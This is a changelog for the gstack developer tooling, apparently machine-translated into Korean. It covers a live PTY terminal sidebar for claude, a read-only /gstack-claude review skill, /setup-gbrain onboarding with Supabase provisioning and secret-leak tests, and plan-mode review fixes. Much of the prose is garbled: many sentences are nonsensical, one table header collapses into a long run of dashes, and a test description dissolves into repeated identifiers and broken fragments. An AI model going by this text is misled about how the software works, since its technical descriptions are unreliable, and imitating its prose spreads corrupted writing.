|---|---|---|---|
| Sidebar 표면 | 채팅 (원샷 `claude -p`) + 3 디버 | 터미널 (라이브 PTY) + 3 디버 | -1 표면, +interactive |
| 세션 당 spawned를 처리하십시오 | 많은 (채팅 메시지 당 1 개) | 원 (PTY claude, 게으른-스파이드) | -N - |
| `extension/sidepanel.js`의 선 | 1969 | 1042 | -47% |
| 총 diff | — | 27 파일, +2875 / -3885 | -1010 그물 |
| 새로운 단위 + 통합 + 회귀 시험 | 0 | 56+ | +56 |
| `tabs.json` push 대기시간 | n/a (no 살아있는 국가) | `chrome.tabs` 이벤트 후 50ms | 새로운 기능 |

### 이 빌더를 위한 뜻

PTY는 슬래시 명령, `/resume`, real ANSI 렌더링, real claude process lifecycle을 의미합니다. Claude가 실행되고 `<stateDir>/tabs.json` + `active-tab.json` 갱신이 있는 동안 브라우저 탭을 전환하십시오. Claude는 `$B tabs`를 요청해야 합니다. 각 탭에서 동일한 일을 할 필요가 있습니까? `$B tab-each <command>`는 배열 JSON를 다시 놓을 때, 활성화된 탭을 no를 돌려줍니다.

오래된 채팅 큐가 사라집니다. `sidebar-agent.ts`, `/sidebar-command`, `/sidebar-chat`, `/sidebar-agent/event` 모든 삭제. Cleanup / 스크린 샷 쿠키 / 도구 모음 버튼은 터미널 팬에서 살아남을 수 있습니다. 클린업은 `window.gstackInjectToTerminal()`를 통해 라이브 PTY로 즉시 프롬프트를 생성합니다.

### 항목화 된 변경

#### 추가

- **상호 작용하는 끝 측바 탭.** xterm.js + `Bun.spawn({terminal: {rows, cols, data}})`로 claude를 쫓는 `terminal-agent.ts` Bun 과정. 측 패널이 열릴 때 자동 연결, no keypress 필요.
- **`$B tab-each <command>`** - 멀티탭 작업에 대한 팬 아웃 헬퍼. `{command, args, total, results: [{tabId, url, title, status, output}]}`를 반환합니다. chrome:// 페이지를 건너, 이더링하기 전에 내부 명령을 확인, `finally` 블록의 원래 활성 탭을 복원, 절대 끌어 당기는 것은 사용자의 전경 앱에서 멀리.
- **탭 상태 파일.** `<stateDir>/tabs.json` (id, url, title, active, pinned, audible, windowId) 및 `<stateDir>/active-tab.json` (current active)를 가진 전체 목록. 모든 `chrome.tabs` 이벤트에 일반적으로 업데이트 (활성화, 생성, 제거, URL/title 변경). Claude 실행 대신 수요에 읽어 `$B tabs`.
- **탭 인식 시스템 신속한**는 `claude --append-system-prompt`를 통해 스페인에서 주사해, 모델은 국가 파일과 `$B tab-each` 명령에 대해 알려지지 않았습니다.
- **항상 눈에 띄는 Restart 단추** 터미널 툴바에서. "session end"상태에서 "제휴 종료"하지 않는 한, 힘-restart claude.

#### 변경
- **사이드바는 터미널 전용입니다.** No 더 많은 `Terminal | Chat` 1차 탭 네브. 활동 / Refs / Inspector는 광부의 `debug` toggle 뒤에 아직도 살다. 빠른 액션 ( ⁇  Cleanup /  스크린 샷 /  ⁇  Cookies)은 터미널 툴바로 이동.
- **WebSocket auth는 `Sec-WebSocket-Protocol`를 사용합니다** 대신 쿠키. 브라우저는 WS 업그레이드에서 `Authorization`를 설정할 수 없으며 `SameSite=Strict` 쿠키는 server.ts:34567에서 크롬 확장 기원으로부터 에이전트의 임의 포트로 크로스 포트 점프를 생존하지 않습니다. token는 `new WebSocket(url, [`gstack-pty.<token>`])`에 승차하고 해당 에이전트는 다시 프로토콜을 에코한다 (Chromium).
- **클린업 버튼이 이제 라이브 PTY를 구동한다.** " ⁇  Cleanup"을 클릭하여 `window.gstackInjectToTerminal()`를 통해 claude로 바로 정리합니다. 검사관 "코드에 보내기"작동은 동일한 경로를 사용합니다. No 더 많은 `/sidebar-command` POSTs.
- **debug-tab 닫기 후 Repaint.** xterm.js는 `display: none`에서 `display: flex`로 컨테이너 플립 때 자동 철회가 되지 않습니다. `#tab-terminal`의 클래스 속성에 MutationObserver는 `fitAddon.fit() + term.refresh() + resize` push를 강제로 하고 팬이 볼 때 `fitAddon.fit() + term.refresh() + resize` push를 강제합니다.

#### 제거
- **`browse/src/sidebar-agent.ts`** - 원샷 `claude -p` 큐어 노동자. ~900 라인.
- **서버 엔드포인트**: `/sidebar-command`, `/sidebar-chat[/clear]`, `/sidebar-agent/{event,kill,stop}`, `/sidebar-tabs[/switch]`, `/sidebar-session{,/new,/list}`, `/sidebar-queue/dismiss`. ~600 선.
- **채팅 관련 국가** in server.ts: `ChatEntry`, `SidebarSession`, `TabAgentState`, `pickSidebarModel`, `addChatEntry`, `processAgentEvent`, `killAgent`, the agent-health watchdog, `chatBuffer`, the per-tab agent map.
- **Chat UI in sidepanel.html**: 1 차 tab nav, `<main id="tab-chat">`, 채팅 입력 막대기, 실험적인 "Browser co-pilot" 기치, 안전 사건 기치, `clear-chat` 발기 단추.
- **5개의 o 쓸모 없는 시험 파일**: `sidebar-agent.test.ts`, `sidebar-agent-roundtrip.test.ts`, `security-e2e-fullstack.test.ts`, `security-review-fullstack.test.ts`, `security-review-sidepanel-e2e.test.ts`. 더하기 5개의 잡담 전용은 안전 시험 (loadSession session-ID validation, switchChatTab DocumentFragment, pollChat reentrancy, sidebar-tabs URL sanitization, 에이전트 큐 보안) 안쪽에 구획을 설명합니다.

#### 기여자
- **`browse/src/pty-session-cookie.ts`** 거울 `sse-session-cookie.ts`. TTL, 동일한 opportunistic pruning, 분리된 레지스트리 (PTY 토큰은 SSE 토큰 또는 부 Versa로 유효하지 않아야 합니다).
- **`docs/designs/SIDEBAR_MESSAGE_FLOW.md`**는 터미널 흐름을 가로지르는 WebSocket 업그레이드, 이중 투킹 모델(`AUTH_TOKEN` for `/pty-session`, `gstack-pty.<token>` for `/ws`, `INTERNAL_TOKEN` for server↔agent loopback), 위협 모델 경계 (Terminal 탭은 목적에 대한 신속한 주입 스택을 우회합니다. 사용자 키 입력은 신뢰할 소스입니다.
- **`browse/test/terminal-agent.test.ts`** (16의 시험) + `terminal-agent-integration.test.ts` (실제 `/bin/bash` PTY 둥근 지구, 익지않는 `Sec-WebSocket-Protocol` 업그레이드 검증) + `tab-each.test.ts` (10개의 시험 모는 `BrowserManager`) + `sidebar-tabs.test.ts` (27개의 구조상 assertions는 채취 그립 invariants를 잠그.
- **CLAUDE.md** 듀얼-토큰 모델로 업데이트, 쿠키-vs-protocol 합리적이고 크로스-팬 사출 패턴.
- **`vendor:xterm`** 빌드 단계 복사 `xterm@5.x` 및 `xterm-addon-fit` 에서 `node_modules/` 에서 `extension/lib/` 빌드 시간. xterm 파일은 gitignored.
- **TODOS.md** carries three v1.1+ follow-ups: PTY session survival across sidebar reload (Issue 1C deferred), `/health` `AUTH_TOKEN` distribution audit (codex finding, pre-existing soft leak), and dropping the now-dead `security-classifier.ts` ML pipeline.

## [1.13.0.0] - 2026-04-25

## **`/gstack-claude`는 비클래드가 read-only 외부 목소리를 호스트합니다.**

이 릴리스는 `/codex`의 역을 추가합니다: 외부 호스트는 이제 Claude를 검토, adversarial 도전, 또는 read-only 상담을 위해 Claude 의 짝지어주는 도구로 요청할 수 있습니다.

### 추가

- `claude/SKILL.md.tmpl`: `review`, `challenge`, `consult` 형태를 가진 새로운 외부 전용 `/gstack-claude` 기술.
- 검토 및 도전 모드는 `--disable-slash-commands` `claude -p --tools ""`에 검출 된 기본 브레이크 diff를 공급합니다.
- 상담 모드는 `Read,Grep,Glob`만 허용하며 `Bash,Edit,Write`를 허용하며, `.context/claude-session-id`를 저장하고, 사전 상담 세션을 재개할 수 있습니다.
- Claude 프롬프트 수송은 지금 `/tmp/gstack-claude-prompt-*` 파일에 stdin를 청소하는 것을 사용하여 관을 꼿습니다.
- Auth 검사는 `claude` CLI를 `~/.claude/.credentials.json` 또는 `ANTHROPIC_API_KEY`로 요구했습니다.
- JSON 출력 파싱 추출물 `result`, `usage`, `model`, `session_id`, `is_error`.

### 고정

- `hosts/claude.ts`: Claude-host 생성에서 Claude 외부 송장 기술을 제외합니다.
- `test/brain-sync.test.ts`: `GSTACK_HOME` 고립 시험은 지금 스냅샷을 지키고 assuming 국부적으로 기계 국가 대신에 진짜 구성 파일을 보존합니다.
- `claude/SKILL.md.tmpl`: `mktemp` for diff review/challenge mode 대신 `$$` 기반 임시 직원 경로로 사용하며, 동시 사고를 피합니다.

### 변경

- `test/skill-validation.test.ts`: 트랙 파일 크기 체크는 지금 자문가입니다. 큰 정착물은 git에서 허용되고 스위트를 실패하는 대신 `[size-warning]`로 보고됩니다.
- `test/gen-skill-docs.test.ts`: 발생 적용은 이제 외부 호스트 docs가 `gstack-claude/SKILL.md`를 포함하며 Claude 호스트 출력 omits `claude/SKILL.md`를 포함합니다.

## [1.12.2.0] - 2026-04-24

## **`/setup-gbrain` 폴란드어: PATH 파싱, repo init 순서, MCP 사용자 범위.**

/setup-gbrain의 작은 정제 경로.

### 고정
- `bin/gstack-gbrain-install`: `awk '{print $NF}'`로 출력되는 파스 `gbrain --version` 이렇게 D19 PATH 그림자 체크는 다만 버전 수를 비교합니다.
- `bin/gstack-brain-init`: `gh repo create`에서 `--source`를 omit `--source`. 나중에 단계 손잡이 `git init` + 명시적으로 원격 설정.
- `setup-gbrain` 단계 9: 연기 시험은 stdin에 관을 두는 몸과 `gbrain put <slug>`를 이용합니다.
- `setup-gbrain` 단계 5a: MCP는 `--scope user`와 gbrain 이진에 절대적인 경로로 등록합니다, 그래서 `mcp__gbrain__*` 도구는 기계에 각 Claude Code 회의에서 유효합니다.

### 변경
- `test/gstack-brain-init-gh-mock.test.ts`: asserts `--source`는 `gh repo create` 호출에서 부패됩니다.

## [1.12.1.0] - 2026-04-24

## **플랜 모드 검토 기술은 검토를 직접 실행, no 더 많은 "exit and rerun" 프롬프트.**

이 릴리스의 앞에, `/plan-eng-review` (그리고 세 다른 `interactive: true` 검토 기술)는 계획 모드를 종료하고 다시 실행하거나 취소 할 것을 요청하는 A/B/C 핸디케이크와 계획 모드 사용자를 수용했다. 즉, 핸디케이크는 vestigial이었다 : 이미 "계획 모드 동안 스킬 인 직업" 규칙은 AskUserQuestion satisfies plan mode's end-of-turn requirements. 두 개의 피라토니티 규칙, 하나의 보스에 대한 절대 검토하지 않을 것입니다. 이 릴리스는 보스를 삭제하고 preamble의 1 위치를 올바른 것을 호이스트 그래서 기술을 통해 직선 실행.

## # 배송

vestigial `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` 결의자는 삭제됩니다. "계획 형태 안전 가동"과 "계획 형태 도중 주장" 구획은 `generate-completion-status.ts`에서 동일한 단위에 있는 주사 `generatePlanModeInfo()` 수출로 분할되고, 그 후에 살아있는 Handhake가 있는 preamble 위치 1에 타전했습니다. "당신은 이 첫번째" 포지셔닝 체재만 보십시오; 내용 변화만. 4개의 죽은 계획 형태 handshake 질문 부주의 ID: IDinteractive ID는 제거됩니다. true` frontmatter flag stays on the four review skill templates because `test/e2e-harness-audit.test.ts` reads it to classify which skills must have `canUseTool` 적용, codex 외부 청구서 검토 당.

E2E 테스트는 연기 테스트로 다시 쓰기를 합니다. 예를 들어, AskUserQuestion, no 초기 `ExitPlanMode`의 `plan-mode-handshake-helpers.ts`가 아닌, no는 /Edit를 먼저 AskUserQuestion, no의 `ExitPlanMode`를 씁니다. 이전 `plan-mode-handshake-helpers.ts`의 쓰기 가드 헬퍼는 이름이 바뀌는 `plan-mode-helpers.ts`의 `test/skill-e2e-plan-mode-no-op.test.ts`를 위해 보존됩니다. 계획 모드 정보 블록은 조용한 외부 계획 모드를 유지합니다. `test/gen-skill-docs.test.ts`는 이제 모든 9 호스트 하위 디더 (`.agents/`, `.openclaw/`, `.kiro/`, 등) 및 asserts `## Plan Mode Handshake`가 absent입니다. 즉, 해결자가 재투자하는 모든 미래 PR를 차단하는 하위 두 번째 단위 게이트입니다.

### 중요 한 숫자

출처: `bun test` 에 HEAD 에 대한 사전 변경 기본.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| Preamble 해결사 | 19 (핸드 쉐이크 + 완료 통계) | 18 (completion-status는 모두 기능을 소유합니다) | -1 단위 |
| 생성된 SKILL.md에 있는 Handshake 선 | 92 기술당 × 4 기술 = 368 | 0 | -368 |
| 질문-registry 항목 | 51 | 47 | -4 죽은 항목 |
| 계획 형태 문 층 시험 | 5개의 핸디크 침식 | 5 연기 + no-op + 쓰기 가드 | 동일한 조사, 더 강한 assertions |
| Multi-host 핸디케이션 단위 테스트 | none | 1 (9 호스트 디어, <1s> | 새로운 회귀 문 |
| `bun test` 변경된 파일 | 360 gen-skill-docs 패스 | 360 gen-skill-docs 패스 | no 회귀 |

새로운 `## Skill Invocation During Plan Mode` 섹션 토지의 전당 위치는 각 `plan-*-review/SKILL.md` (파일의 첫번째 ~15%)의 선 ~127에, 업그레이드 체크 및 내장 게이트 전에, 그래서 권한 계획 형태 규칙은 bash env 설정 후 모델이 읽는 첫 번째 것입니다.

### 계획 모드 사용자를 위한 이 수단은

플랜 모드에서 `/plan-eng-review`를 호출합니다. 범위 모드 질문을 (`SCOPE EXPANSION` / `SELECTIVE EXPANSION` / `HOLD SCOPE` / `SCOPE REDUCTION`) 즉시 검토 실행, 각 발견은 끝에서 `ExitPlanMode` 불을 가져옵니다. No 2 단계 "exit and rerun" 마찰. `/plan-ceo-review`, `/plan-design-review`, `/plan-devex-review`와 같은.

### 항목화 된 변경

#### 고정

- `/plan-eng-review`, `/plan-ceo-review`, `/plan-design-review`, `/plan-devex-review` no는 계획 형태에서 보복될 때 A/B/C 핸디케이크 프롬프트를 더 긴 보여줍니다. 각 기술은 외부 계획 형태 같이 `AskUserQuestion`에 의해 문질러 각 발견과 더불어 상호 작용하는 검토를, 직접 실행합니다.

#### 변경

- "Plan Mode Safe Operations"와 "계획 모드 동안의 스킬 인 직업"프레임 섹션은 이제 완료 시그너스 블록의 꼬리 대신 1 (비쉬 엔브 설정 이후)에 방출됩니다. 모든 기술은 이전의 두 섹션을 볼 수 있습니다. 내용에 대한 다른 변경 사항은 없습니다.
- `test/helpers/plan-mode-handshake-helpers.ts`는 `test/helpers/plan-mode-helpers.ts`로 이름을 딴 것입니다. API는 `runPlanModeSkillTest`에서 `assertNotHandshakeShape`에 `assertHandshakeShape`에서 `assertNotHandshakeShape`에 `assertHandshakeShape`에 `assertNotHandshakeShape`에 no `Write`/`Edit` 도구 호출에서 이름작용되고 `AskUserQuestion`)는 `ExitPlanMode`-before-ask 탐지로 보존되고 확장됩니다.

#### 제거

- `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` 삭제 (vestigial, `generate-completion-status.ts`의 `generatePlanModeInfo`에 의해 초래된).
- `scripts/question-registry.ts`: `plan-ceo-review-plan-mode-handshake`, `plan-eng-review-plan-mode-handshake`, `plan-design-review-plan-mode-handshake`, `plan-devex-review-plan-mode-handshake`에서 제거된 4개의 질문 리건 항목. 이 ID는 no 어떤 기술든지에 의해 더 오래 방출됩니다; 레지스트리에서 그들을 유지하는 죽은 무게.

#### 기여자

- `test/gen-skill-docs.test.ts`는 이제 "계획 모드 정보 해결자"가 (a)가 repo 루트를 제외한 모든 생성 된 `SKILL.md`를 모두 스캔하고 각 호스트 하위디더 (`.agents/`, `.openclaw/`, `.opencode/`, `.factory/`, `.hermes/`, `.kiro/`, `.cursor/`, `.slate/`) 및 asserts `## Plan Mode Handshake`는 absent, 그리고 (berts>)의 각 4개의 `## Skill Invocation During Plan Mode`, `## Skill Invocation During Plan Mode`, `.cursor/`, `.slate/`, `.slate/`, `## Plan Mode Handshake`, `## Plan Mode Handshake`, `## Plan Mode Handshake`, <bertsertsertsertsertsertsertserts. Any PR that re-introduces the handshake resolver fails CI immediately.
- `interactive: true` frontmatter 플래그는 4개의 검토 기술 템플릿에 보존됩니다. 그것은 아직도 독자가 있습니다: `test/e2e-harness-audit.test.ts`는 상호 작용하는 검토 E2E 시험에 `canUseTool` 적용을 강제하기 위하여 그것을 이용합니다. 깃발을 제거하는 것은 처음 계획의 부분이었습니다; codex 외부 음성 검토는 검토 도중 downstream 의존도를 붙잡고 결정은 반전되었습니다.

## [1.12.0.0] - 2026-04-24

## **`/setup-gbrain` — 어떤 코딩 에이전트든지 0에서 "gbrain가 실행되고, 나는 5 분의 밑에 그것을"이라고 부를 수 있습니다.**

gstack v1.9.0.0는 `gbrain-sync`를, 가정했습니다 `gbrain` CLI 이미 설치되었습니다. 그것은 Garry의 기계 (그 수동으로 복제된 `~/git/gbrain`)에 벌금, 다른 사람을 위해 부서지는. 이 방출은 온보드 간격을 닫습니다: 하나의 기술, 세 가지 경로 (현지 PGLite, 기존 Supabase URL, 또는 Supabase 관리 API를 통해 자동 감독, MCP 등록 단계 Claude Code, per-remote trust triad (read-write / read-only / deny)를 통해 MCP 등록 단계, 그리고 다른 기술이 처리 시작할 때 다시 가져올 수 있습니다.

## # 배송

`bin/` 돕기와 새로운 기술 템플릿. `bin/gstack-gbrain-repo-policy` 의 저장 per-remote ingest tiers at `~/.gstack/gbrain-repo-policy.json` 와 `_schema_version: 2` 의 필드 그래서 미래 마이그레이션은 신중한 (첫 번째 하나 - 유산 `allow` → `read-write` - 이미 어떤 사전-D3 파일의 첫 번째 읽기에 실행). `bin/gstack-gbrain-detect` 으로 전체 국가를 방출 JSON 는 이미 단계를 건너뛰는 수 있습니다. `bin/gstack-gbrain-install` 프로브 `~/git/gbrain`와 `~/gbrain` 은 신선한 복제하기 전에 ( 저자의 자신의 기계에 일 1 dup-clone footgun을 두십시오) 그리고 PATH 그림에 실패합니다 경고와 같은 3 선택권 구제 메뉴 대신에. `bin/gstack-gbrain-lib.sh`는 PAT 수집과 풀러-URL 풀러-URL의 하나 떨어져서만 +8/>의 1개의 정립을 위해 이용된 `read_secret_to_env` 돕습니다. `bin/gstack-gbrain-supabase-verify`는 종료 코드 3를 가진 직접 연결 URL (IPv6 전용, 실패)를 대체합니다 그래서 콜러의 재try UX는 일반적인 형식 오류에서 명백합니다. `bin/gstack-gbrain-supabase-provision`는 관리 API — 명부orgs, 창조, poll, 풀러 URL, 명부 오르판, 삭제 프로젝트 — 가득 차있는 HTTP 오류 적용 (401/403/402/409/429/5xx), exponalon-visions, 드문 경우에, 다른 사람의 사이에서, 그리고 다른 사람의 사이에서, 떨어뜨릴 수 있는 경우에.

PAT 컬렉션은 읽기 프롬프트 전에 전체 범위 디플로이션을 보여줍니다. token는 사용자 Supabase 계정에서 모든 프로젝트에 접근 권한을 부여하고 최종적으로 재직 알림을 방출합니다. Path 1's Pooler-URL 붙여넣기는 동일한 위생 플러스 redacted 미리보기 (host / port / 눈에 보이는 데이터베이스, passworded mask)를 가져옵니다. 엔진 사이에 전환 `gbrain migrate` 에서 `timeout 180s` 으로 작동 메시지 deadlock. `mkdir ~/.gstack/.setup-gbrain.lock.d` 을 통해 동시 실행 보호. 텔레메틱스 레코드 시나리오, 설치 결과, MCP 옵트인, 신뢰 계층 — 모든 enumerated categorical 값, 비밀을 누출 할 수있는 무료 형식 문자열.

`/health`는 새로운 GBrain 차원 (무게 10%, `timeout 5s`에서 감싸이는) 유형 체크/lint/시험/드레스 코드/쉘 라이터를 함께 얻습니다. 차원은 omitted - 빨강 - gbrain가 설치되지 않을 때, 그래서 비 GBrain 기계에 `/health`를 달리는 것은 그 선택이 확증하지 않습니다.

`test/helpers/secret-sink-harness.ts`는 새로운 인프라입니다. 시드된 비밀을 가진 하위 프로세스를 실행하고 stdout/stderr/파일-under-HOME/ telemetry-JSONL를 캡처하고, 시드가 4개의 경기 규칙을 통해 어떤 채널에서 나타나지 않는 것을 주장합니다 (예를들면 + URL-decoded + first-12-char prefix + base64). 7개의 긍정적인 통제 시험은 모든 수로에 있는 마구 붙잡음을 증명합니다; 진짜 4개의 시드가 덮는 것은 아무런 gb도 갖는 것을 돕습니다. 비밀을 처리하는 모든 미래 기술은 `runWithSecretSink`를 가져올 수 있으며 같은 패턴을 실행할 수 있습니다.

### 중요 한 숫자

출처: `bun test` Slices 1–7의 다섯 가지 새로운 테스트 파일에 대하여.

| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - | 의 장점 | Time |
|---|---|---|
| `gbrain-repo-policy.test.ts` | 24 | ~1.2s(일) |
| `gbrain-detect-install.test.ts` | 15 | ~1.0s의 |
| `gbrain-lib-verify.test.ts` | 22 | ~0.2s의 |
| `gbrain-supabase-provision.test.ts` | 28 | 13.8s의 |
| `secret-sink-harness.test.ts` | 11 | ~7.0s(초) |
| **Total** | **100** | **~23s(일)** |

HTTP Supabase 관리 API를 위한 오류 경로는 모호 서버 정착물에 의해 덮습니다. 각 비밀 방위 궤는 누출 마구를 통해서 특유한 종자로 운동됩니다.

### Claude Code 사용자를 위한 이 뜻은 무엇입니까

이전: 수동으로 gbrain를 설치, 아무것도 PATH에 그림자, 풀러 URL를 echoing 프롬프트로 붙여, MCP를 직접 파악. 이제: 하나의 명령, 세 경로, PAT-handled-correctly auto-provision, MCP에 등록 된 Claude Code, 멀티 클라이언트 작업에 대한 계층을 신뢰, 누출 테스트 종료. `/setup-gbrain`

### 항목화 된 변경

#### 추가
- `/setup-gbrain` 기술 (`setup-gbrain/SKILL.md.tmpl`) - 경로 선택, PAT-scoped disclosure, redacted URL 시사, concurrent-run 자물쇠, SIGINT 회복, `--cleanup-orphans` subcommand와 `--cleanup-orphans` subcommand.
- `bin/gstack-gbrain-repo-policy` — per-remote trust triad (read-write / read-only / deny), schema-versioned 파일 형식, 원자 쓰기, 손상 파일 quarantine.
- `bin/gstack-gbrain-detect` — JSON 기술 branch를 위한 국가 보고자.
- `bin/gstack-gbrain-install` — D5 검출 첫번째 설치자, D19 PATH 그림자 실패하 단단한 validator, 핀으로 gbrain 투입.
- `bin/gstack-gbrain-lib.sh` — `read_secret_to_env` bash 돕기.
- `bin/gstack-gbrain-supabase-verify` - 직접 연결 거부를 위한 명백한 출구를 가진 구조상 URL validator.
- `bin/gstack-gbrain-supabase-provision` - 관리 API 래퍼 (list-orgs/ create/ wait/pooler-url/list-orphans/ delete-project) 전체 HTTP 오류 적용 및 retry+backoff.
- `test/helpers/secret-sink-harness.ts` - 재사용 가능한 부정적인 공간 누출 테스트 하네스.

#### 변경
- `/health` 기술은 GBrain 복합 치수 (무게 10%, `timeout 5s`)로 감싸인 GBrain를 추가합니다. 0-10 가늠자에 합성 점수를 지키는 것을 재분명하는 종류 무게를 재분명했습니다; `gbrain` 필드 없는 역사 JSONL 입장은 동향 비교를 위해 `null`로 읽습니다.

#### 기여자
- Pre-Impl Gate 1 확인 Supabase 관리 API 어떤 코드가 작성되기 전에 모양. 잘못된 두 가지 엔드 포인트 가정 (`POST /v1/projects` not `/v1/organizations/{ref}/projects`; `/config/database/pooler` not `/config/database`) 및 확인 gbrain's `--non-interactive` + `GBRAIN_DATABASE_URL` env var 가 실제. 계획 파일에 문서화.
- 검토 분야 : CEO 리뷰 + Codex 외부 목소리 + 모든 코드 착륙 전에 계획 모드에서 통과 한 모든 리뷰 (3 리뷰, 21 D-decisions, 0 개의 해결되지 않은 간격).

## [1.11.1.0] - 2026-04-23

## **계획 모드는 침묵적으로 고무 스탬핑을 중단했습니다. 질문은 실제로 불을 겪습니다.**

플랜 모드에서는 `/plan-ceo-review` 또는 어떤 대화형 검토 기술이 있다면, diff를 읽으려면, STOP 게이트를 건너서 플랜 파일을 작성하고, 종료합니다. Zero AskUserQuestion 통화. Zero 모드 선택. Zero per-section 의사 결정. 이 기술 대화형 계약은 플랜 모드의 시스템 제거제에 의해 수행되었으며, 모델이 자체 작업 흐름을 실행하고 모든 것을 무시합니다. 이 릴리스는 어떤 분석 전에 불을 불이 켜지는 preamble-level STOP 문을 추가하므로 항상 대화 형 리뷰를 얻은 기술은 실행하도록 설계되었습니다.

## # 배송

4개의 대화형 검토 기술 (계획소 - 계획, 계획 - eng -review, 계획 - 디자인 -review)는 지금 2 선택권 AskUserQuestion를 방출합니다 순간 계획 형태는 검출됩니다: 출구 및 리런 상호 작용하는, 또는 취소. No 침묵하는 우회. 문은 질문 기입에서 1 방법 문이라고 분류됩니다 그래서 `/plan-tune` 윤곽은 과거에 자동 이형을 할 수 없습니다. Outcome는 `~/.gstack/analytics/skill-usage.jsonl`에 실종 화재가 발생하면, A-exit 및 C-cancel은 엔드-of-run telemetry 블록의 앞에 기술을 종료하는 경우에도 캡처됩니다.

The test harness got a canUseTool extension built on Anthropic's Agent SDK (already installed at v0.2.117). When a test supplies a canUseTool callback, `test/helpers/agent-sdk-runner.ts` flips `permissionMode` from `bypassPermissions` to `default` so the callback actually fires. This is the foundation for asserting AskUserQuestion content end-to-end, which gstack's E2E tests previously couldn't do at all. They had to instruct the model to skip AskUserQuestion entirely. 모든 미래 Interactive-skill 테스트는이에 구축.

### 중요 한 숫자

출처: `test/gen-skill-docs.test.ts` (8개의 시험 덮음 핸디케이션, 부재, 구성 주문, 0C-bis STOP 구획) 및 `test/agent-sdk-runner.test.ts` (6개의 시험 덮음 canUseTool + 허가 형태 + passThrough 돕기). 모든 14는 <250ms, 자유로운 층에서 국부적으로 통행을 통과합니다.

| Surface | 의 전 | 후지후 |
|---|---|---|
| Claude 기술이 핸디케이를 렌더링 | 0 | 4 (계획서, 계획 - eng, 계획 설계, 계획 - devex) |
| Non-Claude 호스트 출력을 손으로 텍스트 | N/A | 0 (`ctx.host === 'claude'` 체크를 통해 호스트스코프) |
| E2E는 AskUserQuestion 내용에 assert 할 수 있는 시험 | 0 | 1개의 마구 primitive, 각 상호 작용하는 기술을 위해 준비하십시오 |
| 4개의 리뷰 기술에 대한 계획 모드 항목 | 공급 업체 | 2 선택권 STOP 문 |
| Step 0C-bis in plan-ceo-review | No STOP 구획은, 0F에 drift 할 수 있었습니다 | Explicit `**STOP.**` 구획 일치 0F 본 |
| Post-handshake telemetry 결과 캡처 | Neither A-exit 또는 C-cancel | 두 (VenPlanMode 전 동기 쓰기) |

### 이 빌더를 위한 뜻

PR 리뷰에서 계획 모드에서 gstack를 실행하면 기술 전에 하나의 질문을 볼 수 있습니다. "Exit plan mode and run interactively, or cancel?" A를 선택하고 esc-esc를 누르면, 정상적인 모드에서 기술을 다시 실행하면 전체 대화 형 리뷰를 얻을 수 있습니다. C를 깨끗하게 가져다. No 더 조용한 고무 스탬프.

새로운 대화형 기술을 구축하는 경우 (gstack), 당신은 지금 실제 E2E 테스트에서 assert에 AskUserQuestion 모양과 canUseTool 마구를 통해 여정을 작성할 수 있습니다. `test/agent-sdk-runner.test.ts` 패턴과 `test/helpers/agent-sdk-runner.ts` API를 참조하십시오.

### 항목화 된 변경

#### 고정

- 플랜 모드 no 더 이상 침묵적으로 AskUserQuestion 게이트를 `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, 또는 `/plan-devex-review`로 건너 뛰고 있습니다. 계획 모드 시스템 제거가 현재 될 때, 어떤 분석 또는 계획 파일 쓰기 전에 사용자 선택을 강제로 첫 번째로 기술이 수행 할 때.
- `/plan-ceo-review` 단계 0C-bis는 이제 단계 0F에 사용된 본을 일치하는 STOP 구획이 있습니다, 그래서 접근 선택 질문은 기술이 계속 형태 선택에 때 침묵적으로 건너 뛰지 않을 수 없습니다.

#### 추가

- 새로운 결의자 `scripts/resolvers/preamble/generate-plan-mode-handshake.ts`는 핸디케이션을 방출하고 텔레메틱스 배쉬를 방출합니다. `ctx.host === 'claude'`를 통해 Claude로 만 호스트를 지정합니다. frontmatter에서 `interactive: true`를 통해 기술 당 Opt-in.
- 기술 템플릿에 새로운 frontmatter 필드 `interactive: boolean`. `scripts/gen-skill-docs.ts`에 의해 파인 발전기 전용 입력은 생성되지 않은 SKILL.md 출력 (`preamble-tier` precedent를 따르십시오).
- `scripts/question-registry.ts`의 `door_type: 'one-way'`를 가진 새로운 질문 등록 항목 `plan-{ceo,eng,design,devex}-review-plan-mode-handshake`. 이 문을 억제할 수 없는 문제 다루기 `never-ask`.
- `~/.gstack/analytics/skill-usage.jsonl`, `A-exit`, `C-cancel`는, `C-cancel`는, 동시에 핸디케이 불로 썼습니다. end-of-run telemetry 뛰기 전에 기술을 종결할 것이다 붙잡음 결과.
- `test/helpers/agent-sdk-runner.ts`는 선택 `canUseTool` 콜백 매개변수로 확장했습니다. 공급될 때, `permissionMode`를 `default`, 자동 추가 `AskUserQuestion`에 `allowedTools`에, 그리고 SDK에 콜백을 전달합니다. AskUserQuestion에 assert만 원하고 시험을 위한 `passThroughNonAskUserQuestion` 도움자는, 다른 도구를 자동 허용하.

#### 기여자

- `test/gen-skill-docs.test.ts` 4개의 상호 작용하는 기술에 있는 Handhake 존재를 확인하는 `test/gen-skill-docs.test.ts`에 있는 5개 단위 시험, 비결합성 기술에 있는 부재, 비결합 주인 산출, 구성 주문 (handshake precedes 격상된 증착 체크) 및 0C-bis STOP 구획 배선.
- `test/agent-sdk-runner.test.ts`에서 6개의 단위 테스트를 추가했습니다 허가 형태 플립, allowedTools 자동 주입, canUseTool callback propagation, 및 통행 대강 도움 행동.
- 새로운 E2E 테스트 표면을 덮는 `test/helpers/touchfiles.ts`에 6개의 문 층 입장을 추가하십시오. 관계되는 기술 템플렛, 핸디케이크 결심자, preamble 구성, 질문 레지스트리, 1 방법 문 분류기, 또는 에이전트 dk-runner 변화의 무엇이든 불능 glob.
